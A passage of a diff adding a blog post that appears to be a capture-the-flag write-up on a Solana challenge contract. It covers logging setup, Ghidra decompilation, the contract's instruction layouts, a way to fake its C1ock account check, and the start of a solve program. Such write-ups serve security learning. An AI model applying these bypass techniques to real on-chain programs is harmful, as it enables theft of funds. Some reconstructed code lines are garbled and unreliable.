+    <span class="k">let</span> <span class="k">mut</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="n">pool</span><span class="nf">.execute</span><span class="p">(</span><span class="k">move</span> <span class="p">||</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="nn">panic</span><span class="p">::</span><span class="nf">catch_unwind</span><span class="p">(||</span> <span class="p">{</span>
+                <span class="k">match</span> <span class="nf">handle_connection</span><span class="p">(</span><span class="n">stream</span><span class="nf">.try_clone</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">())</span> <span class="p">{</span>
+                    <span class="nf">Ok</span><span class="p">(</span><span class="mi">_</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{}</span>
+                    <span class="nf">Err</span><span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="nd">panic!</span><span class="p">(</span><span class="s">"Failed complete: {:?}"</span><span class="p">,</span> <span class="n">error</span><span class="p">),</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="p">);</span>
+
+        <span class="k">match</span> <span class="n">r</span> <span class="p">{</span>
+            <span class="nf">Ok</span><span class="p">(</span><span class="mi">_</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="nd">writeln!</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s">"Successfully handled connection"</span><span class="p">),</span>
+            <span class="nf">Err</span><span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="nd">writeln!</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s">"Problem handling connection: {:?}"</span><span class="p">,</span> <span class="n">error</span><span class="py">.downcast</span><span class="p">::</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">()),</span>
+        <span class="p">}</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This makes it easier to pickup parsing and other errors, however the logs inside the transaction are not included in this in order to do those I made use of <a href="https://docs.rs/gag/latest/gag/">gag</a> and <a href="https://docs.rs/poc-framework/0.1.0/poc_framework/trait.PrintableTransaction.html">PrintableTransaction</a></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">use</span> <span class="nn">poc_framework</span><span class="p">::{</span>
+<span class="o">...</span>
+    <span class="n">PrintableTransaction</span>
+<span class="p">};</span>
+<span class="k">use</span> <span class="nn">gag</span><span class="p">::</span><span class="n">BufferRedirect</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="k">mut</span> <span class="n">buf</span> <span class="o">=</span> <span class="nn">BufferRedirect</span><span class="p">::</span><span class="nf">stdout</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+<span class="k">let</span> <span class="n">txconfirmed</span> <span class="o">=</span> <span class="n">env</span><span class="nf">.execute_transaction</span><span class="p">(</span><span class="n">tx</span><span class="p">);</span>
+<span class="nd">println!</span><span class="p">(</span><span class="s">"+=================================================="</span><span class="p">);</span>
+<span class="n">txconfirmed</span><span class="nf">.print_named</span><span class="p">(</span><span class="s">"my transaction"</span><span class="p">);</span>
+<span class="nd">println!</span><span class="p">(</span><span class="s">"=================================================="</span><span class="p">);</span>
+<span class="k">let</span> <span class="k">mut</span> <span class="n">output</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+<span class="n">buf</span><span class="nf">.read_to_string</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">output</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"logs:"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"{}"</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Now all logs should be output to the TCP stream making it super easy to get them while iterating on things.</p>
+
+<p>On top of this, there is also internal Solana logs which can be super helpful, I didn’t redirect these to the TCP stream but did increase them to verbose, so I could look them when the program was running if something was really odd.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="k">mut</span> <span class="n">env_builder</span> <span class="o">=</span> <span class="nn">LocalEnvironment</span><span class="p">::</span><span class="nf">builder</span><span class="p">();</span>
+<span class="k">let</span> <span class="k">mut</span> <span class="n">env</span> <span class="o">=</span> <span class="n">env_builder</span><span class="nf">.build</span><span class="p">();</span>
+
+<span class="nn">poc_framework</span><span class="p">::</span><span class="nf">setup_logging</span><span class="p">(</span><span class="nn">poc_framework</span><span class="p">::</span><span class="nn">LogLevel</span><span class="p">::</span><span class="n">TRACE</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now that logging is all setup now let’s take a look at the output</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>program pubkey: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn
+solve pubkey: 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY
+user pubkey: 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX
+[+] Receiving all data: Done (2.22KB)
+[*] Closed connection to localhost port 8080
+vault pubkey: 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6
+logs:
++==================================================
+EXECUTE my transaction (slot 0)
+  Recent Blockhash: GzqNGx9wxh9gfyTjkkdQkV13RbfVBDaC1UXgTnww8HJd
+  Signature 0: 2rV3nEMaXcRxXvoqKAVhSwUNnVcSJSUarcpo1vYkfyGJVYT4TeNXFRkPqq3KrxorxPEi4YQ1ry9VyZCDfn2MUa18
+  Account 0: srw- 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX (fee payer)
+  Account 1: -rw- 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6
+  Account 2: -rw- CpCVBEtjy1uxGifo6UsebVoAceLApxAMaJwwaE57nd2V
+  Account 3: -rw- 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdh2
+  Account 4: -r-- C1ockAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  Account 5: -r-- 11111111111111111111111111111111
+  Account 6: -r-- 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn
+  Account 7: -r-x 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY
+  Account 8: -r-- BPFLoaderUpgradeab1e11111111111111111111111
+  Instruction 0
+    Program:   6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY (7)
+    Account 0: C1ockAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (4)
+    Account 1: 11111111111111111111111111111111 (5)
+    Account 2: 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX (0)
+    Account 3: 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6 (1)
+    Account 4: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn (6)
+    Account 5: 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY (7)
+    Account 6: CpCVBEtjy1uxGifo6UsebVoAceLApxAMaJwwaE57nd2V (2)
+    Account 7: BPFLoaderUpgradeab1e11111111111111111111111 (8)
+    Account 8: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdh2 (3)
+    Data: [254, 253, 255]
+  Status: Ok
+    Fee: ◎0
+    Account 0 balance: ◎0.00000001
+    Account 1 balance: ◎0.001
+    Account 2 balance: ◎0
+    Account 3 balance: ◎0
+    Account 4 balance: ◎0
+    Account 5 balance: ◎0.000000001
+    Account 6 balance: ◎0.15607104
+    Account 7 balance: ◎0.02527872
+    Account 8 balance: ◎0.000000001
+  Log Messages:
+    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY invoke [1]
+    Program log: Solution::run
+    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY consumed 431 of 200000 compute units
+    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY success
+==================================================
+
+user bal: 10
+vault bal: 1000000
+Successfully handled connection
+</code></pre></div></div>
+
+<h2 id="decompiling-the-the-solfire-binary">Decompiling the the solfire binary</h2>
+
+<h3 id="getting-ghidra-setup-to-work-with-solfireso">Getting Ghidra setup to work with <code class="language-plaintext highlighter-rouge">solfire.so</code>
+</h3>
+
+<p>Ghidra doesn’t have built-in support for opening eBPF programs.</p>
+
+<p>I initially used the <a href="https://github.com/Nalen98/eBPF-for-Ghidra">eBPF for Ghidra</a> when solving the problem and did a bunch of changes to get it working, but while doing this write-up, I discovered the <a href="https://github.com/Toizi/eBPF-for-Ghidra">eBPF Solana</a> fork that actually has all of the changes needed to support Solana, along with a lot more useful stuff.</p>
+
+<h3 id="examining-the-code">Examining the code</h3>
+
+<p>Looking at the disassembly I noticed that the file paths seem to indicate that this is a C example, which means it’s probably following a similar pattern to the hello world and other C examples with the deserialize function then calling a main-like function.</p>
+
+<p>So I create the relevant <code class="language-plaintext highlighter-rouge">struct</code>s from the Solana SDK to get <code class="language-plaintext highlighter-rouge">SolParameters</code> setup to assume that it is passed into the <code class="language-plaintext highlighter-rouge">solfire</code> function.</p>
+
+<p>The first thing that I notice within this is that it attempts to get the first account passed and calls <code class="language-plaintext highlighter-rouge">b58enc</code> which probably means base-58 encode on it’s key to get a string representation of the key, and verify that it starts with <code class="language-plaintext highlighter-rouge">C1ock</code></p>
+
+<p>Unfortunately Ghidra builds a weird while loop, but this doesn’t actually happen in a loop, it’s just assumed the return was inside the loop not that it was a condition that broke outside the loop.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">offs_in_b58_2</span> <span class="o">&lt;=</span> <span class="n">loop_iterations</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">offs_in_clock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">b58_code_ptr</span><span class="p">[</span><span class="n">offs_in_clock</span><span class="p">]</span> <span class="o">==</span> <span class="s">"C1ock"</span><span class="p">[</span><span class="n">offs_in_clock</span><span class="p">])</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">b58_code_ptr</span><span class="p">[</span><span class="n">offs_in_clock</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="o">||</span>
+         <span class="p">(</span><span class="n">bVar1</span> <span class="o">=</span> <span class="mi">3</span> <span class="o">&lt;</span> <span class="n">offs_in_clock</span><span class="p">,</span> <span class="n">offs_in_clock</span> <span class="o">=</span> <span class="n">offs_in_clock</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bVar1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">offs_in_b58_2</span> <span class="o">&lt;=</span> <span class="n">loop_iterations</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LBB12_11</span><span class="p">;</span>
+        <span class="p">...</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">b58_code_ptr</span> <span class="o">=</span> <span class="n">b58_code_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">loop_iterations</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="err">}</span>
+<span class="n">LBB12_11</span><span class="o">:</span>
+  <span class="n">b58_code_ptr</span> <span class="o">=</span> <span class="s">"bad C1ock account"</span><span class="p">;</span>
+  <span class="n">uVar4</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span>
+<span class="n">LBB12_14</span><span class="o">:</span>
+  <span class="n">sol_log_</span><span class="p">(</span><span class="n">b58_code_p</span>  <span class="n">sol_log_</span><span class="p">(</span><span class="n">b58_code_p</span>
+  <span class="k">return</span> <span class="mh">0x200000000</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+
+<p>When the <code class="language-plaintext highlighter-rouge">C1ock</code> account is verified it will then get the first 4 bytes of the input and treat this as an op-code (0 for <code class="language-plaintext highlighter-rouge">handle_create</code>, 1 for <code class="language-plaintext highlighter-rouge">handle_deposit</code>, 2 for <code class="language-plaintext highlighter-rouge">handle_withdraw</code>)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">data_len</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">sol_panic_</span><span class="p">(</span><span class="s">"./src/solfire/solfire.c"</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">op_choice</span> <span class="o">=</span> <span class="p">(</span><span class="n">longlong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">op_choice</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">handle_create</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">op_choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">handle_deposit</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">op_choice</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">sol_log_</span><span class="p">(</span><span class="s">"invalid op choice"</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
+        <span class="n">log_int</span><span class="p">((</span><span class="n">longlong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mh">0x200000000</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">handle_withdraw</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>You can create a <code class="language-plaintext highlighter-rouge">C1ock</code> account using <code class="language-plaintext highlighter-rouge">solana-keygen</code></p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>solana-keygen grind <span class="nt">--starts-with</span> C1ock:1
+</code></pre></div></div>
+
+<p>The other option is to fake one</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">clock_account</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'C1ock'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user_pubkey</span><span class="p">),</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="handle-create-operation"><strong>Handle create operation</strong></h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">handle_create</code> function, this expects 5 accounts</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Account</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>C1ock account</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>System program</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>New Account (Write, Sign)</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Unused</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>Funding Account (Write, Sign)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The data provided for the instruction is in the following format.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">CreateAccountInput</span>
+<span class="p">{</span>
+	<span class="kt">uint32_t</span> <span class="n">opcode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Set to 0 for handle_create</span>
+	<span class="kt">uint8_t</span> <span class="n">bump_seed</span><span class="p">;</span> <span class="c1">// Used for signing (so just the bump byte), the seed doesn't actually need to get used, just be valid for the solfire program</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>When executed this will call the following system instruction</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CreateAccount</span> <span class="p">{</span>
+    <span class="n">lamports</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span> <span class="c">// The initial balance: set to 1</span>
+    <span class="n">space</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>    <span class="c">// The space allocated for the account: 10kb</span>
+    <span class="n">owner</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="c">// The solfire program key</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="handle-deposit-instruction"><strong>Handle deposit instruction</strong></h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">handle_deposit</code> function, this expects 5 accounts</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Account</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>C1ock account</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>System program</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>An account owned by solfire (Write)</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Funding Account (Write, Sign)</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>Recipient Account (Write)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The data provided for the instruction is in the following format.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">DepositInput</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">opcode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Set to 1 for handle_deposit</span>
+    <span class="kt">uint32_t</span> <span class="n">balance_index</span><span class="p">;</span> <span class="c1">// (MAX: 640) An index on the solfire owned account where the deposit will be added to</span>
+    <span class="kt">uint32_t</span> <span class="n">lamports</span><span class="p">;</span> <span class="c1">// (MIN: 1) The number of lamports to send</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>When executed this will call the following system instruction</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Transfer</span> <span class="p">{</span> <span class="n">lamports</span><span class="p">:</span> <span class="nb">u64</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>When the transfer is done the balance is adjusted, as mentioned above there is some accounting based on <code class="language-plaintext highlighter-rouge">balance_index</code> which is an managed by an array on account 2 (The solfire owned account), this is how it’s adjusted.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">Balance</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">withdraws</span><span class="p">;</span> <span class="c1">// See the next section</span>
+    <span class="kt">uint64_t</span> <span class="n">deposits</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="n">Balance</span> <span class="o">*</span> <span class="n">balances</span> <span class="o">=</span> <span class="p">(</span><span class="n">Balances</span><span class="o">*</span><span class="p">)</span><span class="n">accounts</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">data</span><span class="p">;</span>
+<span class="n">DepositInput</span> <span class="o">*</span> <span class="n">input</span> <span class="o">=</span> <span class="p">(</span><span class="n">DepositInput</span><span class="o">*</span><span class="p">)(</span><span class="n">params</span><span class="p">.</span><span class="n">data</span><span class="p">);</span> 
+
+<span class="n">Balance</span> <span class="o">&amp;</span> <span class="n">balance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">balance_index</span><span class="p">];</span>
+
+<span class="n">balance</span><span class="p">.</span><span class="n">deposits</span> <span class="o">+=</span> <span class="n">input</span><span class="o">-&gt;</span><span class="n">lamports</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h4 id="handle-withdraw-instruction"><strong>Handle withdraw instruction</strong></h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">handle_withdraw</code> function, this expects 5 accounts</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Account</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>C1ock account</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>System program</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>An account owned by solfire (Write)</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Recipient Account (Write, Sign)</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>Funding Account (Write)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The data provided for the instruction is in the following format.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">WithdrawInput</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">opcode</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// Set to 2 for handle_withdraw</span>
+    <span class="kt">uint32_t</span> <span class="n">balance_index</span><span class="p">;</span> <span class="c1">// (MAX: 640) An index on the solfire owned account where the withdraw will come from</span>
+    <span class="kt">uint32_t</span> <span class="n">lamports</span><span class="p">;</span> <span class="c1">// (MIN: 1) The number of lamports to send</span>
+    <span class="kt">uint8_t</span> <span class="n">vault_bump_seed</span><span class="p">;</span> <span class="c1">// A bump seed used for vault signing</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>When executed this will also call the <code class="language-plaintext highlighter-rouge">Transfer</code> instruction, after the transfer is done the balance is adjusted based on <code class="language-plaintext highlighter-rouge">balance_index</code>.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Balance</span> <span class="o">*</span> <span class="n">balances</span> <span class="o">=</span> <span class="p">(</span><span class="n">WithdrawInput</span><span class="o">*</span><span class="p">)</span><span class="n">accounts</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">data</span><span class="p">;</span>
+<span class="n">WithdrawInput</span> <span class="o">*</span> <span class="n">input</span> <span class="o">=</span> <span class="p">(</span><span class="n">DepositInput</span><span class="o">*</span><span class="p">)(</span><span class="n">params</span><span class="p">.</span><span class="n">data</span><span class="p">);</span> 
+
+<span class="n">Balance</span> <span class="o">&amp;</span> <span class="n">balance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">balance_index</span><span class="p">];</span>
+
+<span class="n">balance</span><span class="p">.</span><span class="n">withdraws</span> <span class="o">+=</span> <span class="n">input</span><span class="o">-&gt;</span><span class="n">lamports</span><span class="p">;</span>
+
+<span class="c1">// Ensure the account had enough balance</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">balance</span><span class="p">.</span><span class="n">deposits</span> <span class="o">&lt;</span> <span class="n">balance</span><span class="p">.</span><span class="n">withdraws</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">sol_panic_</span><span class="p">(</span><span class="s">"./src/solfire/solfire.c"</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">175</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="calling-solfire-from-the-solve-program">Calling solfire from the solve program</h2>
+
+<p>In order to use the solfire program we need another account which we don’t already have which can be owned by the solfire program and store balances on.</p>
+
+<p>In order to define this account create a program defined address for the solve account in Python which can be passed around.</p>
+
+<p>We will also need the clock, system account and eventually vault account and it’s bump key.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">solana.publickey</span> <span class="kn">import</span> <span class="n">PublicKey</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">clock_pubkey</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'C1ock'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user_pubkey</span><span class="p">),</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">)</span>
+<span class="n">system_pubkey</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'11111111111111111111111111111111'</span>
+
+<span class="n">_</span><span class="p">,</span> <span class="n">solfire_bump_seed</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">([],</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">program_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)))</span>
+
+<span class="n">balances_pubkey</span><span class="p">,</span> <span class="n">balances_bump_seed</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">([</span><span class="sa">b</span><span class="s">"A"</span><span class="p">],</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">solve_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)))</span>
+<span class="n">balances_pubkey</span> <span class="o">=</span> <span class="n">balances_pubkey</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()</span>
+
+<span class="n">vault_pubkey</span><span class="p">,</span> <span class="n">vault_bump_seed</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">([</span><span class="sa">b</span><span class="s">"vault"</span><span class="p">],</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">program_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)))</span>
+<span class="n">vault_pubkey</span> <span class="o">=</span> <span class="n">vault_pubkey</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()</span>
+
+<span class="c1"># The order of these doesn't matter
+</span><span class="n">accounts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">clock_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">system_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'ws'</span><span class="p">,</span> <span class="n">user_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'w'</span><span class="p">,</span> <span class="n">vault_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">program_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">solve_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'w'</span><span class="p">,</span> <span class="n">balances_pubkey</span><span class="p">),</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<p>We also need the bump see to be ale to sign for this address from our solve program.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ix_data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">solfire_bump_seed</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">balances_bump_seed</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">vault_bump_seed</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now from inside our solve program we need to get these accounts and bump seeds to start using them.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sol_assert</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="n">ka_num</span> <span class="o">==</span> <span class="mi">7</span><span class="p">);</span>
+<span class="n">sol_assert</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="n">data_len</span> <span class="o">==</span> <span class="mi">3</span><span class="p">);</span>
+</code></pre></div></div>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">c1ock_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
